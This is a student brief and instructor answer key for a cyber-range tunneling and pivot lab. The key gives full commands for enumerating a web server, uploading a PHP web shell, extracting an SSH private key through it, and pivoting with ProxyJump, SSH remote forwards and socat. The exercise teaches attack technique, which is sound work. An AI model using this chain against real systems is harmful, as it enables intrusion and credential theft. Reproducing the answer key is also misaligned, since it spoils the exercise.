# Student Brief
## Objective

Get **your** image content displayed in **your two assigned locations** on the projected class screen.

How you present that content is up to you — one image, two different images, or content that changes over time are all acceptable if both of your locations show what you intend.

## Context

Begin from your **ops station**. Your assigned entry target is:

|Setting|Value|
|---|---|
|Starting address|`172.16.172.110`|

Confirm any classroom-specific remapping with your instructor before you begin.

## Tasks

1. Investigate what is reachable from the starting address and what the projected display is asking for.
2. Build whatever access paths you need so your content answers those requests. A path you open toward the web server and a path you expect the web server to open back to you are different. If one does not connect, try the other.
3. When you gain remote execution, verify you are on the intended host before you dig further (`hostname`, identity, working path).
4. Stay on assigned lab systems and do not interfere with other students' work, at least not until they have finished the assignment.

## Deliverables / Evidence

Both of your assigned cells on the projected display show your intended image content.

## Constraints

Stay on assigned lab systems. Confirm remapped addresses with the instructor before treating the table above as live.

Keep image files on your ops station. Do not upload them to any target.

## Success Criteria

**Done when:** both of your assigned cells on the projected display show your intended image content.

## PCTE range limitations

These limits apply on Persistent Cyber Training Environment (PCTE) ranges used by this Module. Treat the items below as a no-strike list when they exist. Not every item is present on every range or host.

Do not target, block, terminate, or delete range-control artifacts:

- **Network:** `10.0.0.0/8` (range control and instrumentation; do not block or flag that traffic). Routers past the edge-router in grey space. TCP `5672` (AMQP user-emulation on the control subnet), `49998`, and `49999`.
- **Accounts:** `range-admin` / `range_admin`, `range-control`, and `range`. Do not use accounts whose username or password contains `simspace`.
- **User emulation:** do not stop it. Typical paths: `C:\Program Files (x86)\Simspace\` and `C:\Users\<Username>\Simspace`. Scripts: `run-actuation.cmd`, `ueactuation.cmd`.
- **Directories:** `C:\Program Files\Puppet Labs` and the Simspace paths above.
- **Processes:** `java.exe`, `javaw.exe`, `ruby.exe`, `rubyw.exe`, `start.exe`, `chromedriver.exe`, `IEDriverServer.exe`, Metova, Selenium, WebDriver.

---

# Tunneling and Pivot — Instructor Answer Key

## Required Tools

- `iproute2` (for confirming the DHCP default route)
- `nmap` (for host discovery and port scanning)
- `curl` (for web enumeration, upload probes, and HTTP GET verification)
- `gobuster` (for directory enumeration against the web root)
- `ssh` (for ProxyJump, local/remote port forwarding, and pivot access)
- `socat` (on the web server, to listen on all interfaces and connect to a loopback SSH forward)
- `python3` (for `python3 -m http.server` image listeners)
- `nc` (Netcat — do not catch a reverse shell from the shared web host back to the ops station; that new session does not cross the NAT)

## Deployment defaults

|Setting|Default|
|---|---|
|Student ops|`172.16.123.100`|
|Student gateway|`172.16.123.253`|
|Gateway outside|DHCP in `192.168.211.0/24`; NAT to the web server|
|Web server|`172.16.172.110` (LocalNet, single interface; student entry)|
|Browser and SSH pivot|`172.16.172.111`|
|LocalNet|`172.16.172.0/24`|
|Status port range|`14000–14019` (instructor assigns one port per student)|
|Example assigned port|`14000`|

Edit `environments/b02_tunneling_pivot/config/lab-addresses.env.example` if your classroom remaps addresses.

---

## 1. Network Routing & Host Discovery

Ops stations are seats on `city-vulnhub` at `172.16.123.100`. Their gateway is `172.16.123.253`. That gateway’s outside address is DHCP in `192.168.211.0/24`, and it NATs traffic to the web server. The shared web host and browser VM are on live-action stack `classroom-shared`. The assigned entry is the web server `172.16.172.110`. The forward filter accepts new sessions to that address and drops new sessions to the rest of `172.16.172.0/24`, including the browser at `172.16.172.111`.

A NAT router on the external-subnet link between the city stack and the shared range accepts sessions the student opens toward the web server. A new session the shared target opens back to an ops station does not arrive, so a Netcat reverse shell to the ops station will not connect. SSH local and remote forwards the student starts toward the web server still work: they ride that outbound session.

Confirm the default route before scanning:

```
ip -4 route show default
```

_`ip -4 route`_ shows the IPv4 routing table. _`show default`_ limits it to the default route. Expect `via 172.16.123.253` with source `172.16.123.100`.

Probe the assigned address:

```
nmap -sn 172.16.172.110
```

_Output excerpt:_

```
Nmap scan report for 172.16.172.110
Host is up (0.000018s latency).
```

**Observation:** The web server answers. A direct probe of `172.16.172.111` does not.

**Inference:** Concentrate service enumeration on `172.16.172.110`. Other LocalNet hosts are not reachable from the ops station.

---

## 2. Service Enumeration

Scan the discovered host for open TCP ports and service versions:

```
nmap -Pn -sV -p- 172.16.172.110
```

_Output excerpt:_

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1
80/tcp open  http    Apache httpd 2.4.x ((Debian))
```

**Observation:** **22/tcp** (SSH) and **80/tcp** (Apache) are open. No other application ports respond on the external interface.

**Inference:** The student-facing entry point is the web service on port 80. SSH may support operator access but is not the first exploitation surface without credentials.

### Initial Web Probing

```
curl -s -D - http://172.16.172.110/ -o /tmp/l211-index.html | head -12
cat /tmp/l211-index.html
```

_Header excerpt:_

```
HTTP/1.1 200 OK
Server: Apache/2.4.x (Debian)
X-Powered-By: PHP/8.x
Content-Type: text/html; charset=UTF-8
```

_Body excerpt:_

```
<form method="post" enctype="multipart/form-data">
<input type="file" name="file">
<input type="submit" value="Upload">
</form>
```

**Observation:** The root page is only a file upload form — no product name, help text, or navigation links.

**Inference:** Behavior after upload must be inferred from the response and follow-on HTTP probes, not from on-page hints.

### Upload Probe

```
printf 'marker-%s\n' "$(date +%s)" > /tmp/probe.txt
curl -s -F 'file=@/tmp/probe.txt;filename=probe.txt' http://172.16.172.110/
```

_Output:_

```
SUCCESS
```

**Observation:** The server accepts the upload and prints **`SUCCESS`** only. No path, filename, or hyperlink is returned.

**Inference:** Uploaded files land somewhere under the web server, but the application deliberately hides the storage location. Next step: map web paths with directory enumeration and look for retrievable content.

---

## 3. Vulnerability Discovery

### Directory Enumeration — Finding `uploads/`

Brute-force common web paths with **gobuster** and Kali’s SecLists wordlist:

```
gobuster dir -u http://172.16.172.110/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  --no-error
```

_`gobuster dir`_ requests `GET /{word}` for each wordlist entry. _`-w`_ selects the path list. _`--no-error`_ suppresses transient connection noise.

_Output excerpt:_

```
/uploads                (Status: 301) [Size: 312]
/index.php              (Status: 200) [Size: 156]
```

**Observation:** A path named **`/uploads`** responds with **301** (directory). The root **`/index.php`** matches the upload form.

**Inference:** Uploaded files likely land under `/uploads/`. Confirm by requesting the directory and looking for the earlier probe file.

```
curl -s http://172.16.172.110/uploads/
```

_Body excerpt (when directory listing is enabled on the target):_

```
<a href="probe.txt">probe.txt</a>
```

**Observation:** The marker file **`probe.txt`** is visible inside **`/uploads/`**.

**Inference:** There is no upload filter blocking arbitrary extensions and no access control preventing retrieval of uploaded content. If the server executes PHP under `/uploads/`, a webshell upload is a credible next test — not because the form advertises it, but because storage is predictable and world-readable/listable.

### Failed Attempt: Expecting the Upload Response to Name the Path

It is easy to assume a bug or misconfiguration would leak the storage directory in the POST response:

```
curl -s -F 'file=@/tmp/probe.txt;filename=second.txt' http://172.16.172.110/ | od -c
```

_Output:_

```
SUCCESS
```

_What we learned:_ The application response is intentionally uninformative. Enumeration — not re-uploading — is required to locate stored files.

---

## 4. Exploit Preparation & Remote Access (Manual)

### Deploy a PHP Web Shell

Create a minimal execution primitive:

```
printf '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
curl -s -F 'file=@/tmp/shell.php;filename=shell.php' http://172.16.172.110/
```

_Output:_

```
SUCCESS
```

Verify execution:

```
curl -s --get --data-urlencode 'cmd=id' http://172.16.172.110/uploads/shell.php
```

_Output:_

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Observation:** The server executes PHP from **`/uploads/shell.php`**.

**Inference:** We have **`web-shell`** execution as **`www-data`** on the staging host. Use it for host survey and to hunt pivot material on the filesystem and under the document root.

### Host Context

```
curl -s --get --data-urlencode 'cmd=hostname' http://172.16.172.110/uploads/shell.php
curl -s --get --data-urlencode 'cmd=pwd' http://172.16.172.110/uploads/shell.php
```

_Output:_

```
target1-staging
/var/www/html/uploads
```

### Discover Pivot Material — `super-secret-storage-directory/`

Survey the document root for directories not linked from the upload page:

```
curl -s --get --data-urlencode 'cmd=ls -la /var/www/html' \
  http://172.16.172.110/uploads/shell.php
```

_Output excerpt:_

```
drwxr-xr-x 2 root root 4096 ... super-secret-storage-directory
drwxr-xr-x 2 www-data www-data 4096 ... uploads
-rw-r--r-- 1 root root  ... index.php
```

**Observation:** A directory named **`super-secret-storage-directory`** sits alongside **`uploads/`** and is not linked from **`index.php`**.

**Inference:** This is a deliberate hidden storage path — enumerate its contents before broader filesystem digging.

```
curl -s --get --data-urlencode 'cmd=ls -la /var/www/html/super-secret-storage-directory' \
  http://172.16.172.110/uploads/shell.php
```

_Output excerpt:_

```
-rw------- 1 www-data www-data  ... id_ed25519
-rw-r--r-- 1 root     root     ... config
```

Retrieve the SSH client config (safe to read via shell):

```
curl -s --get --data-urlencode 'cmd=cat /var/www/html/super-secret-storage-directory/config' \
  http://172.16.172.110/uploads/shell.php
```

_Output:_

```
Host internal-sync
    HostName 172.16.172.111
    User svc-sync
    IdentityFile ./id_ed25519
    StrictHostKeyChecking no
```

**Observation:** The config names **`172.16.172.111`**, user **`svc-sync`**, and a private key **`id_ed25519`** in the same directory.

**Inference:** That host is on LocalNet. New sessions from the ops station to it are dropped. The web server is the jump host. Copy the key to the ops station for the SSH client. The image file stays on the ops station.

Copy the private key to your ops station (example using the webshell and base64 — adjust if you prefer another exfil path):

```
curl -s --get --data-urlencode 'cmd=base64 -w0 /var/www/html/super-secret-storage-directory/id_ed25519' \
  http://172.16.172.110/uploads/shell.php | base64 -d > /tmp/id_ed25519
chmod 600 /tmp/id_ed25519
```

### Failed Attempt: Direct SSH to the Internal Host from the Ops Station

The config file names **`172.16.172.111`**. A natural test is direct SSH from the ops station:

```
ssh -i /tmp/id_ed25519 svc-sync@172.16.172.111
```

_Output excerpt:_

```
ssh: connect to host 172.16.172.111 port 22: Connection timed out
```

_What we learned:_ The forward filter drops new sessions to that address. Pivot **through** the web server with **`ProxyJump`**.

---

## 5. Tunneling & Status Validation

The class status page (`environments/b02_tunneling_pivot/status/status.html`) probes forty cells total:

- **Left 4×5 grid:** HTTP GET `[http://172.16.172.110:](http://172.16.172.110:)<port>/pic.jpg` for ports `14000–14019`
- **Right 4×5 grid:** HTTP GET `[http://127.0.0.1:](http://127.0.0.1:)<port>/pic.jpg` on the browser VM (`172.16.172.111`) for the same ports

Cells stay **red** when the TCP connection is refused, turn **yellow** when a listener answers but `/pic.jpg` is not a loadable image, and display the image on success.

Confirm with your instructor which **assigned port** to use (example below: **`14000`**). The status page runs on the browser VM. The right grid probes that VM’s loopback, not the ops station.

### Step 5a — Reach the pivot host via ProxyJump

From the ops station, chain through the web server:

```
ssh -i /tmp/id_ed25519 \
  -J www-data@172.16.172.110 \
  svc-sync@172.16.172.111
```

_`-J`_ (**ProxyJump**) opens SSH to the jump host first, then connects to the pivot through that session.

If interactive login as **`www-data`** over SSH is disabled, use a local forward to pivot SSH instead:

```
ssh -N -L 2222:172.16.172.111:22 www-data@172.16.172.110
ssh -i /tmp/id_ed25519 -p 2222 svc-sync@127.0.0.1
```

On the pivot host, verify context:

```
hostname
whoami
ip -4 addr show
```

_Expected:_ identity **`svc-sync`**, address **`172.16.172.111`**, hostname distinct from the web server. This VM also runs the status page. Do not start `http.server` here.

### Step 5b — Serve `pic.jpg` on the ops station

Keep the JPEG on the ops station. Do not copy it to the web server or the browser VM.

Terminal A — on the ops station:

```
mkdir -p /tmp/lab-image
cp /path/to/pic.jpg /tmp/lab-image/
cd /tmp/lab-image
python3 -m http.server 14000
```

_`python3 -m http.server`_ serves the **current directory** over plain HTTP on the chosen port. A GET to **`/pic.jpg`** returns the file when it exists in that directory.

Verify on the ops station:

```
curl -s -D - "" | head -8
```

_Output excerpt:_

```
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.x
Content-type: image/jpeg
```

**Observation:** The ops station answers **`GET /pic.jpg`**. The status page does not run on this host, so this check does not change a cell.

**Inference:** Forwards have to pull this listener back to the browser VM and to the web server.

### Step 5c — Right Grid Tunnel (`127.0.0.1:<port>` on the browser VM)

Terminal A stays on `python3 -m http.server`.

Terminal B — from the ops station, bind loopback on the browser VM and forward it to the ops-station listener:

```
ssh -i /tmp/id_ed25519 -N \
  -R 127.0.0.1:14000:127.0.0.1:14000 \
  -J www-data@172.16.172.110 \
  svc-sync@172.16.172.111
```

_`-R`_ (**remote forward**) is `bind_address:port:host:hostport`. The first `127.0.0.1:14000` is opened on the SSH server (the browser VM). The second `127.0.0.1:14000` is the listener on the ops station where this command runs.

Verify on the browser VM:

```
curl -s -D - "" | head -8
```

**Observation:** `127.0.0.1:14000` on the browser VM returns the JPEG that is still stored on the ops station.

**Inference:** The **right** grid cell for port **14000** should transition from red to the image.

### Step 5d — Left Grid Tunnel (`172.16.172.110:<port>`)

The left grid probes the web server on the assigned port. Two listeners share that path. An SSH remote forward binds **loopback only** on the web server and connects back to the ops-station image. `socat` listens on **`0.0.0.0`** at the assigned port and connects to that loopback forward.

Use a different port for the loopback forward. A socket on `0.0.0.0:14000` already covers every address, including `127.0.0.1:14000`, so the SSH listener cannot use `14000`. The example uses **`15000`** on the web server’s loopback and **`14000`** for both the ops-station image and the `socat` listener. For any other assigned port, keep that same split: `socat` and `http.server` use the assigned port, and the SSH loopback port is `1000` higher.

Terminal C — from the ops station, bind only loopback on the web server:

```
ssh -N -R 127.0.0.1:15000:127.0.0.1:14000 www-data@172.16.172.110
```

If **`www-data`** cannot log in over SSH, turn that login on as described in the PCTE setup guide, then rerun this command.

Terminal D — on the web server, as a user who can bind port `14000` (the web shell or an SSH session):

```
socat TCP-LISTEN:14000,bind=0.0.0.0,reuseaddr,fork TCP:127.0.0.1:15000
```

_`socat`_ copies bytes between two addresses. _`TCP-LISTEN:14000,bind=0.0.0.0,reuseaddr,fork`_ accepts connections on every interface at port `14000` and starts a worker for each one. _`reuseaddr`_ lets the listen socket restart without waiting out `TIME_WAIT`. _`TCP:127.0.0.1:15000`_ is the loopback SSH forward from Terminal C. The image file stays on the ops station.

Verify from the browser VM (it can reach the web server on LocalNet):

```
curl -s -D - "" | head -8
```

**Observation:** HTTP GET to the web server’s address returns the same JPEG.

**Inference:** The **left** grid cell for port **14000** should display the image when the status page polls that address.

### Step 5e — Open the Class Status Display

Open `environments/b02_tunneling_pivot/status/status.html` in **Chromium** (or Google Chrome) on the browser VM (`172.16.172.111`). That host can reach the web server on LocalNet and probes its own `127.0.0.1` for the right grid. Edit the config block at the top if your addresses differ. Projection-host browser setup is the Class status display section in `environments/b02_tunneling_pivot/README.md` (disable “Always use secure connections”).

Watch the assigned cell:

|State|Meaning|
|---|---|
|Red|No listener at that host:port|
|Yellow|Listener up, but `/pic.jpg` missing or not an image|
|Image visible|HTTP GET returned a loadable image — student tunnel success|

> **Instructor note:** If `python3 -m http.server` logs TLS/`\x16\x03\x01` **400** responses, or a cell stays red/yellow while `curl http://.../pic.jpg` succeeds, the projector is not using Chromium with secure-connection upgrades disabled (or Firefox is in use). Fix per the Class status display section in `environments/b02_tunneling_pivot/README.md`, then reload.

**Success criterion for the lab:** the student’s assigned cell on the projected display shows their image.

---

## Troubleshooting

|Symptom|Likely cause|Check|
|---|---|---|
|Upload returns `SUCCESS` but no execution|PHP not enabled in `/uploads/`|Apache **`ScriptAlias` / handler** config; retest with **`curl`** against uploaded `.php`|
|`gobuster` finds no `/uploads`|Directory listing disabled; different path|Re-run with a larger wordlist; confirm upload via shell **`find /var/www/html`** after webshell|
|Direct SSH to `172.16.172.111` times out from ops|Expected — forward filter drops new sessions to that address|Use **`-J`** through **`172.16.172.110`**|
|Reverse shell to the ops station never connects|Expected — NAT drops new sessions the shared target opens toward the ops station|Use a path the student opens toward the web server (web shell or SSH forward)|
|Ops-station `curl` to `127.0.0.1:14000` works and the right cell stays red|Forward is not bound on the browser VM|Confirm the **`-R 127.0.0.1:14000`** session to `svc-sync` is running, then `curl` on the browser VM|
|Left grid stays red|`socat` is not listening on `0.0.0.0` at the assigned port, or the loopback SSH forward is down|On the web server, confirm `ss -ltn` shows `0.0.0.0:14000` and `127.0.0.1:15000`; `curl` from the browser VM|
|Yellow cell|HTTP up, wrong path|Ensure **`pic.jpg`** is in the directory where **`http.server`** was started|
|Wrong cell updates|Port collision|Confirm instructor-assigned port; each student uses a distinct port|
|TLS/`\x16\x03\x01` **400** in `http.server`, or no image despite good `curl http://...`|Projector not on Chromium / “Always use secure connections” still on|Instructor: use Chromium per the Class status display section in `environments/b02_tunneling_pivot/README.md`; reload after fixing|

---

## Target Access Enablement

|Repo path|Deploy to|
|---|---|
|`deploy/target1-var-www-html/*`|`/var/www/html/` on the web server (`172.16.172.110`)|
|`deploy/target2-authorized_keys`|`/home/svc-sync/.ssh/authorized_keys` on the browser VM (`172.16.172.111`)|
|`status/status.html`|Browser VM, Chromium or Chrome|
|`deploy/reference/pic.jpg`|Optional instructor JPEG. Student images stay on the ops station|

Tunables: `environments/b02_tunneling_pivot/config/lab-addresses.env.example`

Lab complete when the student’s assigned status cell displays their image on the class screen.